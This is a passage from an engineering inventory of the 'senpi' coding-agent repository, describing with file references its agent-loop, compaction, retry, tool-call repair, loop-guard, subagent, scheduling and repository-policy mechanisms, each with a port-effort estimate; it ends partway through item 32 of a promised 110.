# Năng lực đo được — `senpi` — 110 mục

senpi — M7's dedicated reference. Least audited of the seven.

Nguồn: 6 lens (structure, agent-core, plugin, surface, integration, ops); mọi con số đo bằng lệnh thật.
`idea only=true` = KHÔNG được chép code, chỉ mang ý tưởng.
`port effort` là ước lượng của người kiểm kê, KHÔNG phải số đo.

## senpi.1 Two-tier agent loop with draining steering/follow-up queues

- **where:** packages/agent/src/agent-loop.ts:191-404 (runLoop), :203-212 (refreshTerminatingQueueDrain)
- **what:** An outer loop that restarts when follow-up messages appear after the agent would stop, and an inner loop that processes tool calls plus mid-run steering injection. Includes a `drainedTerminatingQueue` discipline: when a terminating tool batch drains a queue, the loop emits an explicit `turn_start` boundary and sets `turnStartAlreadyEmitted` so queue owners can clear or replace pending input before `prepareNextTurn` re-snapshots it; every abort/error path calls `config.restorePendingMessages(queue, messages)` to put them back.
- **how:** `hasMoreToolCalls = !executedToolBatch.terminate`; steering polled after each turn (`getSteeringMessages`), follow-up polled only when the inner loop drains (`:381-387`).
- **solves:** User steering that arrives while the agent is mid-tool-call either gets injected at a clean boundary or is restored to the queue — never silently dropped, never double-counted. `restorePendingMessages` on the throw path prevents a `prepareNextTurn` throw from eating queued user input.
- **port effort:** medium — the loop shape ports, but the queue-owner/restore contract needs an equivalent admission point in the host's turn boundary | **idea only:** True

## senpi.2 Turn-boundary cut-point selection for compaction

- **where:** packages/coding-agent/src/core/compaction/compaction.ts:471 findValidCutPoints, :489 findTurnStartIndex, :523 findCutPoint; harness twin at packages/agent/src/harness/compaction/compaction.ts:257 shouldCompact
- **what:** Compaction never cuts at a tool result (they must follow their call). It walks backwards accumulating per-message token estimates until `keepRecentTokens` is reached, snaps forward to the nearest valid cut point, then walks backward over context-invisible metadata entries. It reports `turnStartIndex` and `isSplitTurn` so a mid-turn cut can carry the turn's opening user message into the summary.
- **how:** `isCutPointMessage` admits user/assistant/bashExecution; `isTurnStartEntry` scans backwards for the user message that opened the turn.
- **solves:** Cutting at a raw token offset produces an orphan tool_result that every provider rejects. senpi made the cut point a semantic property (turn boundary), not an arithmetic one.
- **port effort:** low — ~120 lines, self-contained, no repo coupling | **idea only:** True

## senpi.3 dropFailedAssistantTurns — cache-prefix-preserving failure eviction

- **where:** packages/ai/src/utils/drop-failed-assistant-turns.ts:20; consumed at packages/coding-agent/src/core/messages.ts:259 and packages/agent/src/harness/messages.ts:173
- **what:** Removes assistant turns with stopReason `error`/`aborted` plus every tool result whose `toolCallId` was declared ONLY by a dropped assistant. An id re-declared by any kept assistant keeps its results. Typed structurally so both `Message[]` and `AgentMessage[]` pass through the same function.
- **how:** Two sets built in one pass, failed-only ids subtracted from kept ids, then a single filter preserving order.
- **solves:** A failed turn is the provider's response to the previous request, never part of it. Replaying it forces a full conversation re-send (cache miss + partial text re-emitted). This is the difference between a retry costing one request and costing the whole session.
- **port effort:** low — 60 lines, drop-in, generic over `{role: string}` | **idea only:** True

## senpi.4 Two-stage retry profile (provider request vs. assistant turn)

- **where:** packages/ai/src/utils/retry-profile/types.ts (RetryPolicyProfile, RetryFailure, RetryStagePolicy), backoff.ts:15 retryBackoffDelayMs; the simpler legacy single-policy path at packages/ai/src/utils/retry.ts:210-241
- **what:** A `RetryPolicyProfile` with two INDEPENDENT stages — `providerRequest` (transport) and `turn` (the whole assistant turn) — plus a `fallback` block that says when a model-fallback chain may consume the turn budget (`terminal: immediate-if-eligible`, `transient: after-turn-budget`, `resetBudgetOnModelChange: true`). Backoff is a pure function with an injected `random` sample, cap applied BEFORE jitter.
- **how:** `exponential = baseDelayMs * growthFactor ** (retryNumber-1)`; `capped = min(exponential, perAttemptCapMs)`; then `additive`/`subtractive`/`none` jitter scaled by the injected sample. `retryDelayMs` (retry.ts:231) does ±10% multiplicative jitter then clamps to 60s, with a comment explaining the ordering: jitter before clamp so a capped delay stays exactly at the cap.
- **solves:** Retry budgets and backoff shapes are genuinely different concerns at the transport and turn layers, and model fallback should not be able to launder a terminal error into a retry. The injectable `random` makes the whole schedule deterministically testable.
- **port effort:** medium — the types are pure and portable; the tiered-hint strategy must be injected from the host side (senpi itself does this to avoid packages/ai → packages/coding-agent dependency) | **idea only:** True

## senpi.5 Failure classification learned from named production incidents

- **where:** packages/ai/src/utils/retry.ts:22 USAGE_LIMIT_EXHAUSTION, :35 QUOTA_EXHAUSTION_PATTERNS, :73 NON_RETRYABLE_PROVIDER_ERROR_PATTERN, :91 RETRYABLE_PROVIDER_ERROR_PATTERN
- **what:** Retryable / non-retryable / quota-exhausted classifier where every pattern carries the incident that produced it. The critical distinction: a 429 with body `{"type":"usage_limit_reached"}` is TERMINAL, not rate-limited, because the account cannot serve any request until quota resets — so every same-account retry is guaranteed to fail. Request-shape rejections (`invalid request: tools....function.parameters`) are also terminal, anchored on the `tools[...]`/`functions[...]` path so unrelated prose mentioning "tools" stays retryable.
- **how:** Regex unions built by `buildProviderErrorPattern`; the quota set is declared once and consumed by BOTH the pattern list and the fallback circuit breaker so the two cannot drift.
- **solves:** Naive "429 = retry" burns an entire retry budget against a dead account, then reports a timeout instead of the real cause.
- **port effort:** low — pure functions, but the pattern list is only as good as the incidents fed into it | **idea only:** True

## senpi.6 Structured overflow detection + bounded shrink-retry

- **where:** packages/ai/src/utils/overflow.ts:42 OVERFLOW_PATTERNS, :85 NON_OVERFLOW_PATTERNS, :164 isContextOverflow, :211 isRecoverableLength; packages/coding-agent/src/core/extensions/builtin/compaction/overflow-retry.ts:22,63,67
- **what:** ~30 provider-specific overflow patterns (Anthropic token + byte forms, OpenAI, Google, xAI, Groq, OpenRouter, Together, Copilot, llama.cpp, LM Studio, MiniMax, Kimi, DS4, z.ai, DashScope, Ollama, Cerebras, Kiro/kiro-lb byte guards) with a separate NON_OVERFLOW exclusion set so Bedrock's `ThrottlingException: Too many tokens` is not read as overflow. On top of it, a summarization-request retry that HALVES the estimated input (rather than dropping one history item), capped at 3 attempts and 240s cumulative wall clock.
- **how:** Pre-sizes the summarization input to 60% of the window; each overflow retry halves the budget; exhaustion throws `SummarizationOverflowExhaustedError{attempts, elapsedMs}` which the deterministic fallback classifies.
- **solves:** Recorded incident in the file: the historical loop removed one item per FULL BILLED attempt, so a wedged session showed "Compacting..." for ~48 minutes and ~13.5M billed tokens. Halving + a hard attempt cap + a wall-clock budget makes the worst case small AND observable.
- **port effort:** low for the pattern list, medium for the shrink-retry harness | **idea only:** True

## senpi.7 Deterministic no-LLM context reduction

- **where:** packages/coding-agent/src/core/extensions/builtin/compaction/context-reduction.ts:1-21
- **what:** Three pure transforms run before summarization so the summarizer pays for shape, not bytes: (1) collapse runs of same-kind read/grep/shell tool results into a one-line label, (2) truncate older long assistant text with a `[response shrunk]` marker, (3) keep the last N tool results in full and replace older clearable ones with `[tool result cleared]`. Returns aggregated token-savings stats.
- **how:** Constants protect recent work: PROTECT_RECENT_MESSAGES=5, PROTECT_RECENT_TOKENS=2000, MAX_ASSISTANT_TEXT_TOKENS=500, KEEP_RECENT_TOOL_RESULTS=3, MIN_SAVINGS_TOKENS=100. Each transform is pure (messages in → new array out).
- **solves:** Cheap tokens back before paying for an LLM summary call. Attributed in-file to plugsuits' `context-collapse` and `micro-compact` patterns — third-party prior art senpi adopted, worth looking up directly.
- **port effort:** low — pure transforms, ~18KB, directly portable | **idea only:** True

## senpi.8 Base64 and image weighting in the token estimator

- **where:** packages/coding-agent/src/core/compaction/compaction.ts:346-363, :386-423
- **what:** The shared chars/4 heuristic is corrected for two content classes that tokenize far denser: unbroken base64/hex runs (≥512 chars) get 4x weight, and images are billed as a flat 4800 chars.
- **how:** `weightedChars` adds `run.length * 3` per base64 match; assistant messages sum text + thinking + toolName + `weightedChars(JSON.stringify(args))`.
- **solves:** Without it a 1MB inline screenshot estimates at ~256K tokens while providers count ~1M — the estimate would say "fits" and the provider would 413.
- **port effort:** low — 20 lines | **idea only:** True

## senpi.9 Tool-call/result pair repair and request-boundary guard

- **where:** packages/coding-agent/src/core/extensions/builtin/compaction/repair-tool-pairs.ts:20; packages/coding-agent/src/core/extensions/builtin/tool-pair-guard/index.ts:6
- **what:** Two layers. `repairOrphanedToolResults` runs before compaction/context reduction: orphan tool_results get a placeholder, dangling tool_calls get a synthesized result (with a model-facing re-issue instruction when the call was `incomplete`), and error/aborted assistants are deliberately skipped. Separately, `tool-pair-guard` hooks `before_provider_request` and sanitizes the payload for three wire dialects, returning `undefined` when the object identity is unchanged.
- **how:** The before_provider_request hook composes sanitizeAnthropicToolPairs → sanitizeOpenAIResponsesPayload → sanitizeOpenAIChatCompletionsPayload.
- **solves:** Every provider rejects an unbalanced tool history, and a 400 on a malformed conversation is undebuggable from the error text. Sanitizing at the wire boundary is the only place where dialect-specific shapes are known.
- **port effort:** low for the repair function; the per-dialect sanitizers live in packages/ai and would need porting with them | **idea only:** False

## senpi.10 Truncation-stop tool-call invalidation

- **where:** packages/agent/src/agent-loop.ts:300-302, :814 failToolCallsFromTruncatedMessage
- **what:** When the assistant message's `stopReason === "length"`, every tool call in that message is failed with a synthetic error rather than executed.
- **how:** Ternary at the dispatch site selecting the fail-path over `executeToolCalls`.
- **solves:** A length stop means the output was cut mid-arguments; every JSON args blob in that message may be malformed or semantically borked. Executing them causes writes with truncated paths.
- **port effort:** low — 30 lines, high value | **idea only:** True

## senpi.11 Tool name auto-correction with a model-only audience

- **where:** packages/agent/src/tool-name-alias.ts:9,13,37; resolution wired at agent-loop.ts:22 and consumed at :1103-1119
- **what:** A model can call a tool by a recased name, a gateway-namespaced name (`mcp__<id>__<Name>`, any case), or without a namespace. The resolver matches only when EXACTLY ONE available tool matches — it never guesses. The correction notice is injected with `audience: "model"`, so it steers the model back to exact names while the user sees the resolved tool as if called directly.
- **how:** `resolveCallTool` runs BEFORE `tool_execution_start` so every event names the tool that executes, never the name the model mistyped. `config.removedToolHints` supplies a per-tool hint when a tool was removed.
- **solves:** Namespace/case drift is the single most common tool-call failure and produces a dead turn. Silently guessing is worse than failing; silently running the wrong tool is worst.
- **port effort:** low — the matcher itself lives in packages/ai/utils/tool-name-match and would port with it | **idea only:** False

## senpi.12 Tool argument purity (structuredClone before shim)

- **where:** packages/agent/src/tool-arguments.ts:10-21
- **what:** Tool argument normalizers run against a `structuredClone`d copy, never the object the assistant message holds.
- **how:** `prepareToolArguments(shim, args)` → `shim(structuredClone(args))`; a dedicated regression test exists at packages/agent/test/tool-argument-purity.test.ts.
- **solves:** Several shims normalize by mutating and returning the same reference. In-place normalization rewrites the answer the provider actually produced, so the Claude SDK continuity fingerprint reports `assistant_rewritten` and the next turn re-sends the entire conversation (senpi#1472).
- **port effort:** low — 22 lines | **idea only:** True

## senpi.13 Canonical-path file mutation queue with in-slot postMutate

- **where:** packages/agent/src/harness/tools/file-mutation-queue.ts:31-61; contract in tools/tool-context.ts
- **what:** Serializes file mutations by (env, canonical path), and runs a post-write hook (formatting, codegen, normalization) INSIDE the same queue slot as the write, so nothing can mutate the file between the write and the fixup. A rejecting hook never discards the landed write — the tool appends a warning note instead.
- **how:** WeakMap-keyed per-ExecutionEnv state; a registration promise serializes key computation, then a chained promise queue per key; `finally` releases and deletes the map entry when the chain tail. Canonical path falls back to absolute on not_found/not_supported.
- **solves:** Two concurrent edits to the same file interleave; a formatter run outside the lock reformats a file someone else just wrote.
- **port effort:** low — 62 lines | **idea only:** True

## senpi.14 Size-proportional output backpressure (AdaptivePublisher)

- **where:** packages/agent/src/harness/utils/adaptive-publisher.ts:22; tuned constants at utils/output-capture.ts:6-7 (OUTPUT_MIN_EMIT_INTERVAL_MS=100, OUTPUT_TARGET_BYTES_PER_SECOND=100*1024)
- **what:** Publishes the latest state without queuing intermediate mutations. The first dirty state after idle flushes immediately; each publication then buys a delay proportional to its ENCODED SIZE, so a 1KB update goes out fast and a 200KB update backs off. A single trailing timer guarantees eventual publication.
- **how:** `nextEmitAt = now + max(minIntervalMs, encodedBytes*1000/targetBytesPerSecond)`. Commit-before-deliver with an explicit comment: a consumer may apply the update and then throw or reenter the producer, and retaining the old baseline would duplicate that delta.
- **solves:** Fixed-interval throttling either floods the TUI on large payloads or lags on small ones. Rate-limiting by bytes rather than by count is the correct unit.
- **port effort:** low — 87 lines, generic | **idea only:** True

## senpi.15 Empty-assistant recovery with a per-model thinking commit policy

- **where:** packages/agent/src/empty-assistant-recovery.ts:29-72; wiring at stream-fn.ts:22 and agent-loop.ts:264 (withEmptyAssistantRecovery wraps every stream)
- **what:** Wraps the stream function to retry turns that produced no visible content. The policy is a per-model-lane boolean: for models with a NATIVE thinking channel, reasoning commits the attempt (holding it back blanks the transcript for the whole phase); for the Kimi XTML lane it does not, because that channel is the documented misrouting vector for text tool calls and the recovery only rewrites the finished message, so a leaked protocol fragment forwarded live could never be retracted (#759). Zero-width/whitespace deltas never commit under any policy.
- **how:** `isMeaningfulContentEvent` gates each event type against the policy; recovery appends a typed diagnostic (`empty_assistant_response_recovery` / `empty_tool_use_response_recovery`) to the message.
- **solves:** Some providers return an empty `stop` turn. Retrying is right — but a retry after streamed reasoning is not, because a second `start` would duplicate the partial message and stitching thinking across attempts breaks signed-block replay, so that case correctly degrades to a retryable error instead.
- **port effort:** medium — the model-lane policy is expressed in TS, which the OMP KDL rule tree would have to absorb to stay compliant with the "no model-name branching in TS" policy | **idea only:** True

## senpi.16 Separate stream-start and stream-idle timeouts

- **where:** packages/agent/src/agent-loop.ts:179 StreamStartTimeoutError, :250-258 initial-vs-subsequent config selection; types.ts:151-165 with the rationale in the doc comment
- **what:** `streamStartTimeoutMs` bounds the wait for the FIRST provider event (a dead upstream that accepts the connection but never answers); `timeoutMs` then governs inter-event idleness. The first request in a loop also gets its own override pair (`initialRequestTimeoutMs`, `initialRequestStreamStartTimeoutMs`).
- **how:** `isInitialProviderRequest` selects the override config once, then `firstProviderRequest = false`. The error message text is deliberately load-bearing: 'The wording must keep matching the retryable-error classifier ("timed out" in packages/ai/src/utils/retry.ts) so a dead stream start is retried instead of dead-ending the session.'
- **solves:** Without a start bound, a hung upstream is only caught by the 5-minute idle default — a full turn's wall clock for a request that will never answer.
- **port effort:** low | **idea only:** True

## senpi.17 Loop guard: identical / similar / cycle detection with escalation

- **where:** packages/coding-agent/src/core/extensions/builtin/loop-guard/detectors.ts:13 (TARGET_FIELDS), :68 detectIdenticalRun, :56 hasAllDistinctTargets, similarity.ts, escalation.ts, notice.ts, policy.ts
- **what:** Three detectors over a rolling tool-call window. `identical` counts a trailing run of the same signature. `similar` compares mean adjacent similarity over a run, EXCLUDING runs whose target identities are all distinct (a read of 6 different files is not a loop). `cycle` finds a repeating period in [CYCLE_MIN_PERIOD, CYCLE_MAX_PERIOD]. Escalation and a hard stop steer the agent out rather than just warning.
- **how:** TARGET_FIELDS names the argument that identifies a call's TARGET per tool: read→path, bash_output→bash_id, task_output→[task_id,name], task_update→task_id, task_send→to, lsp_diagnostics→filePath. Policy constants live in policy.ts (IDENTICAL_RUN_THRESHOLD, SIMILAR_RUN_THRESHOLD, SIMILARITY_THRESHOLD, CYCLE_MIN/MAX_PERIOD, CYCLE_REPETITION_THRESHOLD, ESCALATION_FACTOR, TRACK_WINDOW).
- **solves:** Distinguishing "the agent is stuck re-reading the same file" from "the agent is legitimately reading 6 files" — the target-identity exclusion is the part that makes the detector usable rather than noisy.
- **port effort:** medium — the detectors are portable, but the escalation wiring depends on senpi's `WAKE_SOURCE_STATE_EVENT` / `CONTINUATION_HOLD_STATE_EVENT` monitor state | **idea only:** True

## senpi.18 Warm compaction anchor validated by entry identity

- **where:** packages/coding-agent/src/core/compaction/warm-anchor.ts:17 createWarmAnchorSnapshot, :38 isWarmSummaryAnchorValid
- **what:** A cached summary is reused only when the exact set of entries it summarizes is still the prefix. Validation compares the summarized prefix's entry IDs against the current branch, plus the latest compaction entry ID.
- **how:** Identity comparison, not array position — the doc comment explains why: 'compaction records are appended after the entries they summarize, so a valid next-generation anchor routinely precedes the boundary it updates, and two sibling branches can carry different boundaries at the same index.'
- **solves:** The obvious index-based validity check is wrong for exactly the case warm anchoring exists to serve.
- **port effort:** low — 2KB | **idea only:** True

## senpi.19 Post-compaction restoration with a hard token budget

- **where:** packages/coding-agent/src/core/extensions/builtin/compaction/restoration-tracker.ts:9-31
- **what:** After a compaction, restores a prioritized set of files and skills the model was working in, under an explicit budget: 10 items max, 5000 tokens per item, 50,000 total, and 15% of the context window.
- **how:** Items carry a priority and an estimated token cost; the payload is a typed custom entry (`senpi.compaction.post-compact-restoration.v1`) with `display: false` so it lands in context without cluttering the transcript.
- **solves:** A summary that says "editing foo.ts" without the file's content forces a re-read on the very next turn. Restoration spends a bounded, explicit budget instead.
- **port effort:** medium | **idea only:** True

## senpi.20 Durable lane runtime: 13-state explicit machine over an append-only session

- **where:** packages/agent/src/harness/runtime/drive.ts:34-104; state union at packages/agent/src/harness/session/types.ts:251-342; command types at runtime/types.ts; Lane at runtime/lane.ts:221 (2012 LOC)
- **what:** A second, much more rigorous agent runtime where the loop is a `for(;;) switch(state.at)` over 13 named states (starting, checkpoint, assistant.ready, assistant.effect_pending, assistant.retry_wait, tools, deferred.suspended, deferred.effect_pending, summary.deciding, summary.ready, summary.effect_pending, summary.retry_wait, navigation.ready_to_commit), each with its own procedure AND its own recovery path. Effects are separated from decisions: `LaneCommand`/`OperationCommand` return a writes array + a materialize function, and the Lane pairs the state write with projection publication. A procedure that returns to the same state without a cancel_requested is a `SessionInvariantError`, not a spin.
- **how:** `ProcedureResult` is `{kind:'continue'} | {kind:'waiting'; outcome} | {kind:'settled'; outcome}`. Multiple named lanes share one session, coordinated by a `Drive` claiming the current operation. Durable waits (`retry_not_before`, deferred permits) are first-class states, not sleeps.
- **solves:** Crash recovery and multi-lane coordination become ordinary control flow. A 2012-line Lane is what it costs to keep the state machine honest.
- **port effort:** very high — 24,397 LOC, and it is not on senpi's own production path (see findings) | **idea only:** True

## senpi.21 Session fork with namespace-aware state projection

- **where:** packages/agent/src/harness/session/fork-policy.ts:7 selectBranchFork, :35 projectForkCurrentStateWrite; the JSONL implementation at harness/session/jsonl/fork.ts (328 LOC)
- **what:** Forking walks the parent chain to a requested entry (honoring `position: before|after`), then projects the current-state rows onto the destination with an explicit per-namespace policy: session name always copies, entry labels copy only if the entry was copied, branch tips are rewritten to the destination tip, lane config/state copy only for surviving branches (lane state is RESET to `{currentOperationId:null, lastOperationId:null, inbox:[]}`), and `pi.result` / `pi.op.*` / `pi.pending.*` are never copied. An unknown reserved `pi.*` namespace THROWS rather than being silently dropped.
- **how:** Validation walks and throws 'Corrupt source branch: missing parent' on a hole, and 'Fork entry X is not on source branch Y' when the entry is off-branch.
- **solves:** Forking a session naively copies an in-flight operation or an inbox that belonged to the abandoned branch. The throw-on-unknown-namespace rule is the part that stops a new namespace from silently breaking forks.
- **port effort:** medium | **idea only:** True

## senpi.22 Subagent as a spawned CLI process with three dispatch modes

- **where:** packages/coding-agent/examples/extensions/subagent/index.ts:277 runSingleAgent, :224 mapWithConcurrencyLimit, :476 tool registration; agent discovery at examples/extensions/subagent/agents.ts:122 discoverAgents (user `~/.pi/agent/agents/*.md` + nearest-parent project `.pi/agents/*.md`)
- **what:** Delegates to a named agent defined by a markdown file with `name`/`description`/`tools`/`model` frontmatter. Three modes: single, parallel (array, capped at 8, concurrency 4), and chain (sequential, each step's `task` gets the previous step's final output substituted into `{previous}` placeholders; a failed step stops the chain). The child is `pi --mode json -p --no-session --append-system-prompt <tmpfile>`; stdout is line-parsed JSON, and `message_end` events accumulate per-task usage (input/output/cacheRead/cacheWrite/cost/turns) that is aggregated into `SubagentDetails`. Abort escalates SIGTERM → SIGKILL after 5s.
- **how:** Tool name is `subagent`. Per-task output is capped at 50KB by `truncateParallelOutput` (byte-accurate, backoff-slices to a UTF-8 boundary). Project-scope agents require a UI confirmation gate when the repo is untrusted.
- **solves:** Process-level isolation gives each subagent a genuinely empty context window with no in-process state leakage.
- **port effort:** low to port the file, but see findings — the design is what OMP should NOT copy | **idea only:** False

## senpi.23 Side query (/btw) with tool-free context isolation

- **where:** packages/coding-agent/src/core/extensions/builtin/btw/side-query.ts (SIDE_QUERY_INSTRUCTION:22, boundSideQueryMessages:37, buildSideQueryContext:65, runSideQuery:110)
- **what:** A side question answered from the current conversation WITHOUT touching the main task: builds a context from the session history, appends a fixed non-continuation instruction, and issues a raw `streamSimple` with `tools: []`. The context is bounded to the model's real prompt window by reducing, repairing orphan tool pairs, and pruning to budget, then throwing a typed error if it still does not fit.
- **how:** `boundSideQueryMessages` computes the message budget, and if over, runs reduceContextMessages → repairOrphanedToolResults → pruneOldMessagesToBudget → repairOrphanedToolResults, re-checking after each. `DEFAULT_ESTABLISHMENT_TIMEOUT_MS = 30_000`.
- **solves:** "What was that env var again?" should not consume a turn, mutate state, or extend the main conversation. `tools: []` makes the non-mutation structural rather than prompt-level.
- **port effort:** low | **idea only:** True

## senpi.24 Host-authorized session-worker credit (SharedArrayBuffer blocking)

- **where:** packages/coding-agent/src/modes/rpc/session-worker-credit.ts:24-50; protocol constants in modes/rpc/session-worker-protocol.ts (69 LOC); worker lifecycle in experimental/session-worker-manager.ts (885 LOC)
- **what:** Spawned session workers must obtain host permission before touching a writer, publishing output, or resizing a display. The worker blocks its own thread with `Atomics.wait` on a 4-byte SharedArrayBuffer until the host answers `granted | conflict | limit`.
- **how:** `installWriteReservation` maps conflict→`throw new Error("session_path_in_use")` and limit→`throw new Error("session_reservation_limit")` — both recoverable domain errors — while a missing answer is worker-fatal (`session_worker_credit_timeout`).
- **solves:** Multi-process sessions on shared files need a mutex the worker cannot bypass, and it must be synchronous because a worker thread cannot await a host round-trip inside a synchronous tool API.
- **port effort:** medium | **idea only:** True

## senpi.25 Autonomous loop scheduler (wakeup over an agent session)

- **where:** packages/coding-agent/src/core/extensions/builtin/loop/index.ts:1-20 (the rules as comments), types.ts (LOOP_PHASES, LoopPayload, LoopSentinel), scheduler.ts (33 KB), store.ts (18 KB), tick-prompt.ts, cron-planner.ts
- **what:** A `/loop` feature that re-prompts a session on a fixed or model-scheduled cadence. Six phases (starting, waiting, queued, running, suspended, ended) with exhaustive terminal reasons. The load-bearing rules are stated in the file header: a tick NEVER steers (idle goes through `sendUserMessage` with `expandPromptTemplates: true` so a slash payload reaches the real command path; a busy session receives it as a follow-up); shutdown SUSPENDS rather than ends (every shutdown reason is resumable); keepalive applies only to an attributed dynamic iteration, never after an ordinary turn and never after a user abort; and a store failure ends the affected loops with `error` rather than being swallowed, because a schedule that cannot be persisted must not keep running.
- **how:** Pure decision modules (scheduler, tick-prompt, cron-planner, loopfile, status) with all impure wiring isolated in index.ts. Sentinels `<<autonomous-loop>>` / `<<autonomous-loop-dynamic>>` / `<<loop.md>>` anchor the state file.
- **solves:** Long-running autonomous work that survives a restart without either losing the schedule or running away from a schedule that can no longer be persisted.
- **port effort:** high — but the four rules in the header are worth copying verbatim into OMP's own scheduler | **idea only:** True

## senpi.26 Per-directory changes.md tracker with upstream-pin coverage gate

- **where:** `packages/coding-agent/src/core/changes.md` (480 KB) and 60 sibling trackers; policy in root `AGENTS.md` under "CHANGES.MD TRACKER POLICY"; enforced by `scripts/check-pr-changelog.mjs` (per-PR, wired to `.github/workflows/changelog-gate.yml`) and `scripts/audit-changes-md.mjs` (whole-tree, `--format json|markdown`).
- **what:** Every directory that diverges from upstream carries a `changes.md` with four mandatory headings per entry: `What changed`, `Why`, `Why an extension could not handle it`, `Expected merge conflict zones`. Coverage is computed against the pinned upstream tree in `.github/upstream.json` (tag+sha), so a path is upstream-owned iff it exists in that tree.
- **how:** `scripts/changes-md-policy.mjs` computes production scope (excludes trackers, lockfiles, tests, docs, `*.generated.*`), walks each changed path to its EXACT nearest ancestor tracker, and fails if no entry names that exact repo-relative path. Pin-sync PRs get a narrow exemption for paths that exactly match the new pin.
- **solves:** Making a long-lived fork of a fast-moving upstream reviewable: every divergence is self-documenting at the point of code, and a mechanical gate stops the fork from silently accumulating un-recorded deltas that turn the next upstream merge into an archaeology exercise.
- **port effort:** Medium. The idea is a few hundred lines plus a documented policy; the expensive part is the taxonomy of what counts as "production" vs exempt, which you must tune to your own repo. Directly portable. | **idea only:** True

## senpi.27 Distributed AGENTS.md tree (73 files) as a hierarchical map

- **where:** Root `AGENTS.md`; nested at `packages/ai/src/tool-call-middleware/AGENTS.md`, `packages/coding-agent/src/core/extensions/builtin/mcp/AGENTS.md`, `crates/senpi-grep/AGENTS.md`, `scripts/AGENTS.md`, etc.
- **what:** Root AGENTS.md is a ~19 KB router: a STRUCTURE table, a WHERE-TO-LOOK table, a CODE MAP of the 5 highest-risk files, COMMANDS, CONVENTIONS, QUALITY GATES, DEPENDENCIES, GIT AND DELIVERY. It deliberately holds NO file-level detail and defers to the ~72 nested AGENTS.md, one per meaningful directory down to `test/suite/regressions/`.
- **how:** Single filename across all vendors — no CLAUDE.md/GEMINI.md variants exist (verified: `git ls-files | grep -iE '(claude|gemini|codex|qwen)...\.md$'` is empty). Rule in the root file: "read the nearest one before editing".
- **solves:** Keeping per-directory agent context fresh without one unmaintainable mega-file. Each subdirectory owns its own map, so a change to `builtin/mcp/` updates `builtin/mcp/AGENTS.md` and nothing else.
- **port effort:** Low mechanically, high in discipline. The value is the rule that detail lives at the leaf and the root only routes. Note the file is machine-generated (header: `Generated: <date> / Commit: <sha>`) and this copy is 4,270 commits stale — the generation is the load-bearing part. | **idea only:** True

## senpi.28 Vendored Codex app-server protocol with a handwritten facade over untouched generated bytes

- **where:** `packages/coding-agent/src/modes/app-server/protocol/generated/` (620 files, 6,621 lines) and its 20-file facade beside it. Regenerated by `packages/coding-agent/scripts/generate-app-server-protocol.sh`.
- **what:** 620 tracked files of Codex's `app-server` TypeScript protocol schema are copied in verbatim from a pinned Codex commit, plus `PROTOCOL_VERSION.txt` recording `codex-git <sha> (<author date>)`. A separate handwritten facade layer sits on top and is the only thing app code may import.
- **how:** Three-part trick, all documented in that dir's README: (1) the script copies the Codex checkout's `codex-rs/app-server-protocol/schema/typescript` recursively and DELETES files no longer upstream, preserving only a local `generated/package.json`; (2) that one shim file marks the subtree CommonJS so ts-rs's extensionless sibling imports still typecheck under Node16/NodeNext ESM WITHOUT altering a single generated byte; (3) the package build excludes `generated/**/*.ts` so the raw tree is type evidence, not build input.
- **solves:** Getting exact wire compatibility with another agent's protocol (Codex) without forking their repo and without letting their generated code leak into your dependency graph or break your compiler settings.
- **port effort:** Medium-high. The CommonJS-shim idea is the genuinely novel bit and is portable as-is; the facade discipline ("runtime must import the facade, never `generated/**`") is the rule that keeps it from rotting. | **idea only:** True

## senpi.29 Extension-first architecture with one authoritative ordering array

- **where:** `packages/coding-agent/src/core/extensions/builtin/` (57 entries); authority is `builtin/index.ts` lines 65-122.
- **what:** 44 builtin extensions, each in its own directory with its own `index.ts`, `AGENTS.md`, `changes.md` and tests, registered through a single exported array. Comments in that array state WHY each entry sits where it does.
- **how:** `export const builtinExtensions: BuiltinExtensionFactory[] = [...]` with inline rationale per entry, e.g. "Keep MCP last so its eventual provider-payload tap observes all co-resident builtin mutations" and "Loop guard owns the first veto opportunity so repeated calls never re-run hooks or permission prompts." Root AGENTS.md: "the only authority on numbering... never quote a registration number from prose."
- **solves:** Order-dependent behavior in a plugin-style system is invisible by default. Encoding the order plus its load-bearing reasons in one file makes the ordering a reviewable artifact instead of an emergent accident.
- **port effort:** Low. Cheap to adopt, high payoff. The "one authority, never quote it in prose" clause is the part worth copying verbatim. | **idea only:** True

## senpi.30 Fork-publish name rewriting (upstream names never reach npm)

- **where:** `scripts/publish.mjs` + `scripts/registry-packages.mjs` + `scripts/prepare-senpi-publish-manifest.mjs`; documented in root AGENTS.md "RELEASE NOTES".
- **what:** All workspace manifests stay `private: true` under upstream's `@earendil-works/pi-*` names, so the in-repo dependency graph keeps reading like upstream. Only at publish time are manifests rewritten to `@code-yeongyu/senpi-*`.
- **how:** `registry-packages.mjs` maps directory -> `registryName`; `getPublicWorkspacePackages()` in `scripts/release-packages.mjs` consumes that map. Because published names differ from manifest names, the runtime-dep contract has to be re-derived — release-packages.mjs carries an explicit comment about this ("The fork's published sources are private: true under their upstream names... so the fork's runtime-dependency contract is the union").
- **solves:** Letting a fork keep upstream's file layout and internal import graph (so upstream merges apply cleanly) while still owning its published artifact identity.
- **port effort:** High. This is release-engineering heavy and assumes a similar fork shape. The idea is reusable; the implementation is not copy-pasteable. | **idea only:** True

## senpi.31 Three package managers supported in parallel, with a self-test for the manifest rules

- **where:** Root `package.json` (60+ scripts), `pnpm-workspace.yaml`, `scripts/verify-package-managers.mjs`, `scripts/run-workspaces.mjs`, `scripts/root-workspace-scripts.test.mjs`.
- **what:** npm, pnpm and bun are all first-class: `bun.lock`, `package-lock.json` and `pnpm-workspace.yaml` are all committed, and `scripts/verify-package-managers.mjs` snapshots the worktree to a temp dir per PM, deletes foreign lockfiles, and runs install+build for each.
- **how:** Root scripts reach workspaces ONLY via `node scripts/run-workspaces.mjs`. Root AGENTS.md documents why, with a scar: "`npm run --workspaces`... hardcode npm, and under bun the flag-after-name form re-entered the root script forever." `scripts/root-workspace-scripts.test.mjs` fails the manifest if any of those shapes reappear.
- **solves:** Preventing the silent PM-specific footguns that break a multi-PM repo, and turning each lesson into a manifest-level assertion rather than tribal knowledge.
- **port effort:** Medium. `run-workspaces.mjs` plus a manifest test is portable; the ban-list should be rewritten for whatever PMs you actually support. | **idea only:** True

## senpi.32 Test suite that outgrows the source it tests

- **where:** `packages/coding-agent/test/` (1,985 files); `test/suite/regressions/AGENTS.md`.
- **what:** 1,650 `*.test.ts` files; 349,513 test lines against 237,382 src lines. A named `test/suite/regressions/` subtree (312 files) with its own AGENTS.md holds one test per fixed real-world issue, plus golden/`.jsonl` fixture dirs and snapshot tests.
